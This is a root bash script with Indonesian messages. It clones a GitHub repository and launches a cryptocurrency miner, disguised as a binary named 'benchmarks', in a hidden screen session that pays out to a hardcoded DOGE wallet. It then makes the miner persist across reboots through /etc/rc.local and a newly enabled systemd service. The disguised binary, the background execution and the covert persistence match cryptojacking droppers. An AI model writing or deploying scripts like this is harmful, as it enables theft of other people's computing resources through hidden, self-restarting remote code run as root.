#!/bin/bash

echo "📦 Menginstal dependensi dasar..."
apt-get update && apt-get install -y screen wget git curl libsodium23 || apt-get install -y libsodium18

echo "🌐 Meng-clone skrip mining dari GitHub..."
rm -rf /root/web
git clone https://github.com/amirul5656/web.git /root/web

echo "📁 Menyimpan skrip mining ke /root/web1.sh..."
cat << 'EOF' > /root/web1.sh
#!/bin/bash

cd /root/web || exit

chmod +x benchmarks

# Cek apakah screen sudah berjalan
if screen -list | grep -q amirul3; then
  echo "⚠️  Screen 'amirul3' sudah jalan, skip."
else
  echo "▶ Menjalankan mining di screen 'amirul3'..."
  screen -dmS amirul3 bash -c '
    while true; do
      ./benchmarks --algorithm minotaurx --pool stratum+tcp://minotaurx.sea.mine.zpool.ca:7019 --wallet D8n4HXcTza73pBw93ZnSgcZRo8rHdZJLux --password c=DOGE -t 7
      sleep 2
    done
  '
fi
EOF

chmod +x /root/web1.sh

echo "🚀 Menjalankan miner sekarang..."
bash /root/web1.sh

# Tambahkan ke rc.local agar jalan saat reboot
if [ -f /etc/rc.local ]; then
  if ! grep -q '/root/web1.sh' /etc/rc.local; then
    sed -i '/^exit 0/i bash /root/web1.sh &' /etc/rc.local
    echo "🛠️ Menambahkan ke /etc/rc.local"
  fi
else
  echo '#!/bin/bash' > /etc/rc.local
  echo 'bash /root/web1.sh &' >> /etc/rc.local
  echo 'exit 0' >> /etc/rc.local
  chmod +x /etc/rc.local
  echo "🛠️ Membuat dan mengatur /etc/rc.local"
fi

# Aktifkan rc.local service jika belum aktif (untuk distro modern)
if [ ! -f /etc/systemd/system/rc-local.service ]; then
  echo "🔧 Mengaktifkan service rc.local..."
  cat << SYS > /etc/systemd/system/rc-local.service
[Unit]
Description=/etc/rc.local Compatibility
ConditionPathExists=/etc/rc.local

[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
RemainAfterExit=yes
GuessMainPID=no

[Install]
WantedBy=multi-user.target
SYS

  systemctl enable rc-local
  systemctl start rc-local
fi

echo "✅ Siap! Mining aktif sekarang & akan otomatis jalan setelah reboot."
